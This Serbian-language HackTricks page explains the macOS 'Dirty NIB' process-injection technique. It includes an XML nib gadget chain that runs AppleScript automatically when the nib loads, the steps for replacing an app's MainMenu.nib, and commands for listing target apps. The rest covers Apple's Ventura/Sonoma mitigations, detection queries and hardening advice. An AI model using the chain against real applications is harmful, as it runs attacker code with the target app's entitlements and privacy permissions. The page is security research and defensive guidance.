# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB se odnosi na zloupotrebu Interface Builder datoteka (.xib/.nib) unutar potpisanog macOS app bundle-a radi izvršavanja logike pod kontrolom napadača unutar ciljnog procesa, čime se nasleđuju njegovi entitlements i TCC permissions. Ovu tehniku je prvobitno dokumentovao xpn (MDSec), a kasnije ju je generalizovao i značajno proširio Sector7, koji je takođe obradio Apple-ove mitigacije u macOS 13 Ventura i macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Za osnovne informacije i detaljne analize pogledajte reference na kraju.

> TL;DR
> • Pre macOS 13 Ventura: zamena MainMenu.nib datoteke bundle-a (ili drugog nib-a koji se učitava pri pokretanju) mogla je pouzdano da omogući process injection i često privilege escalation.
> • Od macOS 13 (Ventura), uz poboljšanja u macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints i nova TCC „App Management“ permission u velikoj meri sprečavaju nib tampering nakon pokretanja od strane nepovezanih app-ova. Napadi i dalje mogu biti izvodljivi u specifičnim slučajevima (npr. same-developer tooling koji menja sopstvene app-ove ili terminali kojima je korisnik dodelio App Management/Full Disk Access).


## Šta su NIB/XIB datoteke

Nib (skraćeno od NeXT Interface Builder) datoteke su serijalizovani UI object graph-ovi koje koriste AppKit app-ovi. Moderni Xcode čuva editabilne XML .xib datoteke, koje se tokom build-a kompajliraju u .nib. Tipičan app učitava svoj glavni UI preko `NSApplicationMain()`, koji čita `NSMainNibFile` ključ iz app-ovog Info.plist-a i instancira object graph tokom runtime-a.

Ključne tačke koje omogućavaju napad:
- NIB loading instancira proizvoljne Objective-C klase bez zahteva da budu usklađene sa NSSecureCoding (Apple-ov nib loader koristi `init`/`initWithFrame:` kao fallback kada `initWithCoder:` nije dostupan).
- Cocoa Bindings se mogu zloupotrebiti za pozivanje metoda tokom instanciranja nib-ova, uključujući ulančane pozive koji ne zahtevaju interakciju korisnika.


## Dirty NIB injection process (attacker view)

Klasičan pre-Ventura tok:
1) Kreirajte malicious .xib
- Dodajte `NSAppleScript` objekat (ili druge „gadget“ klase kao što je `NSTask`).
- Dodajte `NSTextField` čiji title sadrži payload (npr. AppleScript ili command arguments).
- Dodajte jedan ili više `NSMenuItem` objekata povezanih preko bindings-a za pozivanje metoda na ciljnom objektu.

2) Auto-trigger bez klikova korisnika
- Koristite bindings da postavite target/selector stavke menija, a zatim pozovete privatnu `_corePerformAction` metodu kako bi se action automatski izvršio pri učitavanju nib-a. Time se uklanja potreba da korisnik klikne na dugme.

Minimalni primer auto-trigger lanca unutar .xib datoteke (skraćeno radi jasnoće):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Ovo omogućava proizvoljno izvršavanje AppleScript-a u ciljnom procesu prilikom učitavanja nib-a.<sup>[[1]](#references)</sup> Napredni lanci mogu da:
- Instanciraju proizvoljne AppKit klase (npr. `NSTask`) i pozovu metode bez argumenata kao što je `-launch`.
- Pozovu proizvoljne selektore sa objektima kao argumentima pomoću prethodno opisanog binding trika.
- Učitaju AppleScriptObjC.framework kako bi napravili most do Objective-C-ja i čak pozvali odabrane C API-je.
- Na starijim sistemima koji još uvek sadrže Python.framework, naprave most do Python-a, a zatim koriste `ctypes` za pozivanje proizvoljnih C funkcija (istraživanje kompanije Sector7).<sup>[[2]](#references)</sup>

3) Zamenite nib aplikacije
- Kopirajte target.app na lokaciju sa dozvolom za upis, zamenite npr. `Contents/Resources/MainMenu.nib` zlonamernim nib-om i pokrenite target.app. Pre Ventura-e, nakon jednokratne Gatekeeper procene, naredna pokretanja su obavljala samo površne provere potpisa, tako da se neizvršni resursi (kao što je .nib) nisu ponovo proveravali.

Primer AppleScript payload-a za vidljiv test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS zaštite (Ventura/Monterey/Sonoma/Sequoia)

Apple je uveo nekoliko sistemskih mitigacija koje drastično smanjuju izvodljivost tehnike Dirty NIB u modernom macOS-u:<sup>[[2]](#references)</sup>
- Dubinska verifikacija pri prvom pokretanju i zaštita bundle-a (macOS 13 Ventura)
- Pri prvom pokretanju bilo koje aplikacije (sa karantinom ili bez njega), dubinska provera potpisa obuhvata sve resurse bundle-a. Nakon toga bundle postaje zaštićen: samo aplikacije istog developera (ili aplikacije kojima je to eksplicitno dozvoljeno) mogu menjati njegov sadržaj. Drugim aplikacijama je potrebna nova TCC dozvola “App Management” za upis u bundle druge aplikacije.
- Launch Constraints (macOS 13 Ventura)
- System/Apple-bundled aplikacije ne mogu da se kopiraju na drugo mesto i pokreću; ovo onemogućava pristup „kopiraj u /tmp, izmeni, pokreni“ za OS aplikacije.
- Poboljšanja u macOS 14 Sonoma
- Apple je dodatno ojačao App Management i ispravio poznate bypass-e (npr. CVE‑2023‑40450) koje je naveo Sector7. Python.framework je ranije uklonjen (macOS 12.3), čime su prekinuti neki lanci privilege escalation-a.
- Promene u Gatekeeper-u/karantinu
- Za širu diskusiju o Gatekeeper-u, poreklu i promenama u proceni koje su uticale na ovu tehniku, pogledajte stranicu navedenu u nastavku.

> Praktična posledica
> • Na Ventura+ generalno ne možete menjati `.nib` datoteku aplikacije treće strane osim ako vaš proces ima App Management ili je potpisan istim Team ID-jem kao ciljna aplikacija (npr. developer tooling).
> • Dodeljivanje App Management-a ili Full Disk Access-a shell-ovima/terminalima efektivno ponovo otvara ovu attack surface za sve što može izvršavati kod u kontekstu tog terminala.


### Rešavanje problema sa Launch Constraints

Launch Constraints blokira pokretanje mnogih Apple aplikacija sa lokacija koje nisu podrazumevane, počevši od Ventura-e. Ako ste se oslanjali na workflow-e pre Ventura-e, kao što su kopiranje Apple aplikacije u privremeni direktorijum, menjanje `MainMenu.nib` datoteke i njeno pokretanje, očekujte da to neće raditi na >= 13.0.


## Enumerisanje ciljeva i nib datoteka (korisno za istraživanje / legacy sisteme)

- Pronađite aplikacije čiji UI koristi nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Pronađite potencijalne nib resurse unutar bundle-a:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Detaljno proverite potpise koda (provera neće uspeti ako ste menjali resurse, a zatim ponovo potpisali kod):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Napomena: Na modernom macOS-u takođe ćete biti blokirani zaštitom bundle-a/TCC-om kada pokušate da upišete sadržaj u bundle druge aplikacije bez odgovarajuće autorizacije.


## Saveti za detekciju i DFIR

- Monitoring integriteta datoteka u resursima bundle-a
- Pratite promene `mtime/ctime` vrednosti za `Contents/Resources/*.nib` i druge neizvršne resurse u instaliranim aplikacijama.
- Unified logs i ponašanje procesa
- Pratite neočekivano izvršavanje AppleScript-a unutar GUI aplikacija i procese koji učitavaju AppleScriptObjC ili Python.framework. Primer:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktivne procene
- Periodično pokrećite `codesign --verify --deep` nad kritičnim aplikacijama kako biste osigurali da resursi ostanu nepromenjeni.
- Kontekst privilegija
- Proverite ko/šta ima TCC dozvolu „App Management“ ili Full Disk Access (posebno terminali i management agenti). Uklanjanje ovih dozvola iz shell-ova opšte namene sprečava jednostavno ponovno omogućavanje manipulacije u stilu Dirty NIB-a.


## Mere zaštite (developeri i defenderi)

- Dajte prednost programskom UI-ju ili ograničite ono što se instancira iz nib-ova. Izbegavajte uključivanje moćnih klasa (npr. `NSTask`) u nib grafove i izbegavajte binding-e koji indirektno pozivaju selektore na proizvoljnim objektima.
- Usvojite hardened runtime sa Library Validation funkcijom (već je standard za moderne aplikacije). Iako ovo samo po sebi ne sprečava nib injection, blokira jednostavno učitavanje native koda i napadače primorava na payload-e zasnovane isključivo na scripting-u.
- Nemojte zahtevati niti koristiti široke App Management dozvole u alatima opšte namene. Ako MDM zahteva App Management, odvojite taj kontekst od shell-ova kojima upravlja korisnik.
- Redovno proveravajte integritet bundle-a svoje aplikacije i obezbedite da mehanizmi za ažuriranje mogu sami da poprave resurse bundle-a.


## Povezano štivo na HackTricks

Saznajte više o Gatekeeper-u, quarantine-u i promenama provenance-a koje utiču na ovu tehniku:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Reference

- [1] [xpn – DirtyNIB (originalni write-up sa primerom za Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5. april 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
